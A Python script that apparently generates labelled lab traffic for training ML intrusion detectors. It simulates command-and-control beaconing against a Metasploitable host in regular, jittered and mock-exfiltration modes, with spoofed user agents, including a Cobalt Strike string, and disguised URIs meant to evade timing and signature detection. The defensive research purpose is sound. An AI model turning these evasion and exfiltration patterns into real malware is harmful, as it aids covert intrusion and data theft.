#!/usr/bin/env python3
# ============================================================
# c2_beacon.py
# Attack Type: Command & Control (C2) beaconing simulation
# Tool: Python (custom)
# Source: Kali Linux (192.168.20.20)
# Target: Metasploitable web server (192.168.30.20)
#
# What this does:
#   Simulates malware that has already compromised a host and
#   is "phoning home" to a C2 server for instructions.
#   Sends periodic HTTP requests at regular intervals —
#   the defining characteristic of C2 beaconing behavior.
#
# How it differs from previous scripts:
#   Nmap:       Loud, fast, obvious reconnaissance
#   Metasploit: One-time exploit attempt
#   Hydra:      High-volume credential flood
#   Slowloris:  Resource exhaustion, many connections
#   This:       Quiet, persistent, periodic — designed to hide
#
# What makes beaconing detectable by ML (not rules):
#   - Regular inter-arrival time (low variance between requests)
#   - Small, consistent payload sizes
#   - Unusual request timing (e.g., every 30s at 3am)
#   - These patterns are invisible to signature-based IDS
#     but clearly anomalous to a trained classifier
#
# What Suricata may see:
#   - Possibly nothing (that's the point of C2 beaconing)
#   - ET MALWARE/C2 rules if User-Agent or URI matches known C2
#   - Flow records showing regular inter-arrival times
#
# Three beacon modes simulated:
#   1. Regular beacon  — perfectly timed, obvious to ML
#   2. Jittered beacon — adds randomness to evade timing detection
#   3. Data exfil      — larger periodic transfers (simulates
#                        sending stolen data back to C2)
#
# Usage:
#   python3 c2_beacon.py [--mode regular|jitter|exfil]
#                        [--duration 300]
#                        [--interval 30]
#
# After running, log this session in data/session_log.csv:
#   timestamp_start, timestamp_end, c2_beacon,
#   192.168.30.20, malicious, mode=regular/jitter/exfil
# ============================================================

import argparse
import base64
import random
import socket
import string
import sys
import time
from datetime import datetime

# ── Configuration ────────────────────────────────────────────
TARGET_IP   = "192.168.30.20"
TARGET_PORT = 80
OUTPUT_LOG  = "/tmp/c2_beacon_log.txt"

# Fake C2 User-Agent strings — simulate different malware families
# Real malware often uses fake or slightly-off browser strings
C2_USER_AGENTS = [
    # Slightly wrong Chrome version (common malware pattern)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4444.77",
    # Outdated browser (suspicious in 2026)
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
    # Custom C2 framework string
    "Mozilla/5.0 (compatible; CobaltStrike/4.0)",
    # Generic — blends in with legitimate traffic
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

# Fake URI paths — C2 often uses paths that look like legitimate
# web requests but encode commands or check-in data
C2_URIS = [
    "/index.php?id={}",
    "/api/v1/update?token={}",
    "/static/js/analytics.js?v={}",
    "/images/pixel.gif?uid={}",
    "/favicon.ico?r={}",
]

def generate_beacon_id():
    """Generate a fake 'infected host ID' encoded in the request."""
    # Real C2 malware encodes host info in requests
    # We simulate this with a random-looking base64 string
    fake_host_data = f"KALI-{random.randint(1000,9999)}"
    return base64.b64encode(fake_host_data.encode()).decode()[:12]

def send_beacon(target_ip, target_port, user_agent, uri, beacon_id):
    """
    Send a single HTTP beacon request.
    
    This simulates a compromised host checking in with its C2 server.
    The request looks like a normal HTTP GET but the timing pattern
    and URI structure reveal its true nature to an ML classifier.
    """
    try:
        # Build the HTTP request manually
        # Real C2 malware often crafts raw HTTP rather than using
        # a library to avoid detection by behavioral analysis
        formatted_uri = uri.format(beacon_id)
        request = (
            f"GET {formatted_uri} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

        # Open TCP connection and send beacon
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, target_port))
        sock.send(request.encode())

        # Read response (C2 would parse this for instructions)
        response = sock.recv(1024).decode(errors='ignore')
        sock.close()

        # Extract status code from response
        status = response.split('\n')[0].strip() if response else "No response"
        return True, status

    except Exception as e:
        return False, str(e)

def beacon_regular(duration, interval, log_file):
    """
    Mode 1: Regular beaconing — perfectly timed intervals.
    
    This is the most obvious pattern to detect.
    Every request arrives exactly 'interval' seconds after the last.
    Inter-arrival time variance is essentially zero.
    
    Real-world example: early Poison Ivy RAT beaconed every 60s exactly.
    """
    print(f"\n[MODE] Regular beacon every {interval}s for {duration}s")
    print(f"[*] This creates a perfectly regular timing pattern\n")

    user_agent = C2_USER_AGENTS[0]
    uri = C2_URIS[0]
    beacon_id = generate_beacon_id()
    count = 0
    start = time.time()

    while time.time() - start < duration:
        count += 1
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        success, status = send_beacon(TARGET_IP, TARGET_PORT,
                                       user_agent, uri, beacon_id)

        log_entry = f"[{timestamp}] Beacon #{count} | {'OK' if success else 'FAIL'} | {status}"
        print(log_entry)
        log_file.write(log_entry + "\n")
        log_file.flush()

        # Wait exactly 'interval' seconds — no randomness
        # This regularity is what ML detects
        time.sleep(interval)

def beacon_jittered(duration, interval, log_file):
    """
    Mode 2: Jittered beaconing — randomized timing.
    
    More sophisticated malware adds random delays to avoid
    timing-based detection. Instead of exactly 30s, it sleeps
    for 30s ± 0-10s randomly.
    
    Harder to detect with simple timing rules, but ML can still
    find it by looking at the distribution of inter-arrival times.
    Even jittered beacons cluster around their base interval.
    
    Real-world example: Modern Cobalt Strike beacons use jitter %.
    """
    jitter = interval * 0.3  # 30% jitter
    print(f"\n[MODE] Jittered beacon ~every {interval}s (±{jitter:.0f}s) for {duration}s")
    print(f"[*] Adds randomness to evade timing detection\n")

    beacon_id = generate_beacon_id()
    count = 0
    start = time.time()

    while time.time() - start < duration:
        count += 1
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Rotate through different user agents and URIs
        # More sophisticated evasion
        user_agent = C2_USER_AGENTS[count % len(C2_USER_AGENTS)]
        uri = C2_URIS[count % len(C2_URIS)]

        success, status = send_beacon(TARGET_IP, TARGET_PORT,
                                       user_agent, uri, beacon_id)

        # Random sleep: base interval ± jitter
        sleep_time = interval + random.uniform(-jitter, jitter)
        sleep_time = max(5, sleep_time)  # never less than 5s

        log_entry = (f"[{timestamp}] Beacon #{count} | "
                     f"{'OK' if success else 'FAIL'} | "
                     f"next in {sleep_time:.1f}s")
        print(log_entry)
        log_file.write(log_entry + "\n")
        log_file.flush()

        time.sleep(sleep_time)

def beacon_exfil(duration, interval, log_file):
    """
    Mode 3: Data exfiltration simulation.
    
    Simulates malware periodically sending stolen data back to C2.
    Instead of small check-in beacons, it sends larger POST requests
    with fake encoded 'stolen data' in the body.
    
    Creates different flow characteristics:
    - Larger payload sizes (not just headers)
    - Outbound data exceeds inbound (opposite of normal browsing)
    - POST requests rather than GET
    
    Real-world example: keyloggers that upload keystroke logs every hour.
    """
    print(f"\n[MODE] Exfiltration beacon every {interval}s for {duration}s")
    print(f"[*] Simulates sending stolen data to C2\n")

    beacon_id = generate_beacon_id()
    count = 0
    start = time.time()

    while time.time() - start < duration:
        count += 1
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Generate fake "stolen data" — random base64 encoded string
        # Real exfil would be encrypted credentials, files, etc.
        fake_data_size = random.randint(200, 2000)
        fake_data = base64.b64encode(
            ''.join(random.choices(string.ascii_letters + string.digits,
                                   k=fake_data_size)).encode()
        ).decode()

        try:
            # Build a POST request with exfil data in body
            body = f"data={fake_data}&id={beacon_id}"
            request = (
                f"POST /api/v1/collect HTTP/1.1\r\n"
                f"Host: {TARGET_IP}\r\n"
                f"User-Agent: {C2_USER_AGENTS[1]}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
                f"{body}"
            )

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((TARGET_IP, TARGET_PORT))
            sock.send(request.encode())
            response = sock.recv(512).decode(errors='ignore')
            sock.close()

            status = response.split('\n')[0].strip() if response else "No response"
            log_entry = (f"[{timestamp}] Exfil #{count} | "
                         f"{len(body)} bytes sent | {status}")
        except Exception as e:
            log_entry = f"[{timestamp}] Exfil #{count} | FAIL | {e}"

        print(log_entry)
        log_file.write(log_entry + "\n")
        log_file.flush()

        time.sleep(interval + random.uniform(0, 5))

# ── Main ─────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="C2 Beaconing Simulator — generates realistic C2 traffic patterns"
    )
    parser.add_argument(
        "--mode",
        choices=["regular", "jitter", "exfil", "all"],
        default="all",
        help="Beacon mode (default: all — runs all three sequentially)"
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=120,
        help="How long to run each mode in seconds (default: 120)"
    )
    parser.add_argument(
        "--interval",
        type=int,
        default=15,
        help="Base beacon interval in seconds (default: 15)"
    )
    args = parser.parse_args()

    print("============================================")
    print(" C2 Beacon Simulator")
    print(f" Started:  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f" Target:   {TARGET_IP}:{TARGET_PORT}")
    print(f" Mode:     {args.mode}")
    print(f" Duration: {args.duration}s per mode")
    print(f" Interval: {args.interval}s")
    print("============================================")
    print()
    print("[!] Record this start time in session_log.csv")
    print()

    with open(OUTPUT_LOG, 'w') as log_file:
        log_file.write(f"C2 Beacon Log — {datetime.now()}\n")
        log_file.write(f"Target: {TARGET_IP}:{TARGET_PORT}\n\n")

        if args.mode in ("regular", "all"):
            beacon_regular(args.duration, args.interval, log_file)

        if args.mode in ("jitter", "all"):
            beacon_jittered(args.duration, args.interval, log_file)

        if args.mode in ("exfil", "all"):
            beacon_exfil(args.duration, args.interval, log_file)

    print("\n============================================")
    print(f" Complete: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f" Log saved: {OUTPUT_LOG}")
    print("============================================")
    print()
    print("[!] Record this end time in session_log.csv")
    print("[!] Label: malicious")
    print("[!] Scenario: c2_beacon")
    print("[!] Notes: include which mode(s) were run")

if __name__ == "__main__":
    main()
